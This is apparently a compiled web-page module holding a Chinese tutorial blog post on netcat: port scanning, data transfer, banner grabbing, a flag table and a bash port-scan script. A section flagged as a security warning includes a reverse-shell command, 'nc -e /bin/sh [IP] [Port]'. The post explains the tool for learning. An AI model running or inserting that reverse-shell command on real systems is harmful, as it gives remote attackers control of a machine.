import{n as e,r as t}from"./app-BoaHcSM-.js";import{t as n}from"./plugin-vue_export-helper-BBNlaSNf.js";var r=JSON.parse(`{"path":"/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%9A%84%E6%A6%82%E5%BF%B5/%E4%BC%A0%E8%BE%93%E5%B1%82/%E7%AB%AF%E5%8F%A3%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/Netcat%E5%91%BD%E4%BB%A4.html","title":"Netcat命令","lang":"zh-CN","frontmatter":{"title":"Netcat命令","icon":"network","date":"2026-07-23T00:00:00.000Z","category":["计算机网络"],"description":"在网络工程领域，nc（全称 Netcat）被誉为网络工具中的“瑞士军刀”。它是一个非常强大且灵活的网络实用程序，能够通过 TCP 或 UDP 协议读取和写入网络连接。 因为它功能太全，既可以当调试工具，也可以被当作黑客工具。 nc 的主要功能 1. 端口扫描 虽然不如 nmap 那么专业，但 nc 可以快速检查目标主机的特定端口是否开放。 命令：nc ...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Netcat命令\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2026-07-23T00:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Kinger\\",\\"url\\":\\"https://www.yuque.com/kinger-wwnro\\"}]}"],["meta",{"property":"og:url","content":"https://venking.tech/blog/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%9A%84%E6%A6%82%E5%BF%B5/%E4%BC%A0%E8%BE%93%E5%B1%82/%E7%AB%AF%E5%8F%A3%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/Netcat%E5%91%BD%E4%BB%A4.html"}],["meta",{"property":"og:site_name","content":"Kinger 的技术博客"}],["meta",{"property":"og:title","content":"Netcat命令"}],["meta",{"property":"og:description","content":"在网络工程领域，nc（全称 Netcat）被誉为网络工具中的“瑞士军刀”。它是一个非常强大且灵活的网络实用程序，能够通过 TCP 或 UDP 协议读取和写入网络连接。 因为它功能太全，既可以当调试工具，也可以被当作黑客工具。 nc 的主要功能 1. 端口扫描 虽然不如 nmap 那么专业，但 nc 可以快速检查目标主机的特定端口是否开放。 命令：nc ..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:published_time","content":"2026-07-23T00:00:00.000Z"}]]},"git":{},"readingTime":{"minutes":2.21,"words":662},"filePathRelative":"posts/计算机网络/网络的概念/传输层/端口相关命令/Netcat命令.md","excerpt":"<p>在网络工程领域，<code>nc</code>（全称 <strong>Netcat</strong>）被誉为网络工具中的“瑞士军刀”。它是一个非常强大且灵活的网络实用程序，能够通过 TCP 或 UDP 协议读取和写入网络连接。</p>\\n<p>因为它功能太全，既可以当调试工具，也可以被当作黑客工具。</p>\\n<hr>\\n<h3><code>nc</code> 的主要功能</h3>\\n<h4>1. 端口扫描</h4>\\n<p>虽然不如 <code>nmap</code> 那么专业，但 <code>nc</code> 可以快速检查目标主机的特定端口是否开放。</p>\\n<ul>\\n<li><strong>命令：</strong><code>nc -zv 192.168.1.1 80</code></li>\\n<li><strong>解释：</strong><code>-z</code> 表示扫描模式（不发送数据），<code>-v</code> 表示详细输出。</li>\\n</ul>","autoDesc":true}`),i={name:`Netcat命令.md`},a=[`innerHTML`];function o(n,r,i,o,s,c){return t(),e(`div`,{class:`vp-migrated-content`,innerHTML:`<div><p>在网络工程领域，<code v-pre>nc</code>（全称 <strong>Netcat</strong>）被誉为网络工具中的“瑞士军刀”。它是一个非常强大且灵活的网络实用程序，能够通过 TCP 或 UDP 协议读取和写入网络连接。</p>
<p>因为它功能太全，既可以当调试工具，也可以被当作黑客工具。</p>
<hr>
<h3 id="nc-的主要功能" tabindex="-1"><a class="header-anchor" href="#nc-的主要功能"><span><code v-pre>nc</code> 的主要功能</span></a></h3>
<h4 id="_1-端口扫描" tabindex="-1"><a class="header-anchor" href="#_1-端口扫描"><span>1. 端口扫描</span></a></h4>
<p>虽然不如 <code v-pre>nmap</code> 那么专业，但 <code v-pre>nc</code> 可以快速检查目标主机的特定端口是否开放。</p>
<ul>
<li><strong>命令：</strong><code v-pre>nc -zv 192.168.1.1 80</code></li>
<li><strong>解释：</strong><code v-pre>-z</code> 表示扫描模式（不发送数据），<code v-pre>-v</code> 表示详细输出。</li>
</ul>
<h4 id="_2-简易聊天-数据传输" tabindex="-1"><a class="header-anchor" href="#_2-简易聊天-数据传输"><span>2. 简易聊天/数据传输</span></a></h4>
<p>你可以在两台机器之间建立一个原始的通信管道。</p>
<ul>
<li><strong>接收端：</strong><code v-pre>nc -l 8888</code>（监听 8888 端口）</li>
<li><strong>发送端：</strong><code v-pre>nc [接收端IP] 8888</code></li>
<li>连接建立后，你在一方输入文字，另一方就能看到；也可以用来传输文件（配合重定向符号 <code v-pre>&gt;</code>）。</li>
</ul>
<h4 id="_3-测试服务响应-banner-grabbing" tabindex="-1"><a class="header-anchor" href="#_3-测试服务响应-banner-grabbing"><span>3. 测试服务响应 (Banner Grabbing)</span></a></h4>
<p>你可以手动连接到某个服务端口，查看它返回的欢迎信息或协议版本。</p>
<ul>
<li><strong>命令：</strong><code v-pre>nc www.google.com 80</code></li>
<li>连接后输入 <code v-pre>GET / HTTP/1.1</code> 并回车，你可以看到服务器返回的原始 HTTP 响应头。</li>
</ul>
<h4 id="_4-远程后门-安全警告" tabindex="-1"><a class="header-anchor" href="#_4-远程后门-安全警告"><span>4. 远程后门（安全警告！）</span></a></h4>
<p>在黑客攻击或应急响应中，<code v-pre>nc</code> 常被用来制作“正向”或“反向” Shell。</p>
<ul>
<li><strong>命令示例：</strong><code v-pre>nc -e /bin/sh [IP] [Port]</code></li>
<li>这会将本机的 Shell 环境通过网络发送给另一台机器，使其能够远程控制本机。</li>
</ul>
<hr>
<h3 id="常用参数速查表" tabindex="-1"><a class="header-anchor" href="#常用参数速查表"><span>常用参数速查表</span></a></h3>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code v-pre>-l</code></td>
<td>使用监听模式 (Listen)，等待连接。</td>
</tr>
<tr>
<td><code v-pre>-p</code></td>
<td>指定本地监听的端口号。</td>
</tr>
<tr>
<td><code v-pre>-v</code></td>
<td>显示指令执行过程的详细信息 (Verbose)。</td>
</tr>
<tr>
<td><code v-pre>-u</code></td>
<td>使用 UDP 协议（默认是 TCP）。</td>
</tr>
<tr>
<td><code v-pre>-z</code></td>
<td>仅扫描端口，不发送任何数据。</td>
</tr>
<tr>
<td><code v-pre>-w</code></td>
<td>设置超时时间（秒）。</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="注意事项" tabindex="-1"><a class="header-anchor" href="#注意事项"><span>注意事项</span></a></h3>
<ol>
<li><strong>版本差异：</strong> Linux 上常见的有两个版本：<code v-pre>nmap-ncat</code> (功能最强) 和 <code v-pre>openbsd-netcat</code>。有些版本不支持 <code v-pre>-e</code> 参数（出于安全考虑）。</li>
<li><strong>权限控制：</strong> 监听 1024 以下的知名端口（如 80, 443）通常需要 root 权限。</li>
</ol>
<p>​</p>
<p>​</p>
<h3 id="扫描有哪些服务端口-扫描脚本" tabindex="-1"><a class="header-anchor" href="#扫描有哪些服务端口-扫描脚本"><span>扫描有哪些服务端口（扫描脚本）</span></a></h3>
<div class="language-plain line-numbers-mode" data-highlighter="shiki" data-ext="plain" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code" v-pre=""><code class="language-plain"><span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 配置目标 IP 和扫描范围</span></span>
<span class="line"><span>TARGET="127.0.0.1"</span></span>
<span class="line"><span>START_PORT=1</span></span>
<span class="line"><span>END_PORT=1024</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo "正在扫描 $TARGET 的端口 ($START_PORT 到 $END_PORT)..."</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 循环遍历端口</span></span>
<span class="line"><span>for ((port=$START_PORT; port&#x3C;=$END_PORT; port++))</span></span>
<span class="line"><span>do</span></span>
<span class="line"><span>    # nc 参数说明：</span></span>
<span class="line"><span>    # -z: 扫描模式（不发送数据）</span></span>
<span class="line"><span>    # -v: 详细模式（配合 2>&#x26;1 捕获输出）</span></span>
<span class="line"><span>    # -w 1: 超时时间为 1 秒</span></span>
<span class="line"><span>    (echo > /dev/tcp/$TARGET/$port) >/dev/null 2>&#x26;1 &#x26;&#x26; echo "端口 $port [开放]"</span></span>
<span class="line"><span>done</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo "扫描完成。"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div>`},null,8,a)}var s=n(i,[[`render`,o]]);export{r as _pageData,s as default};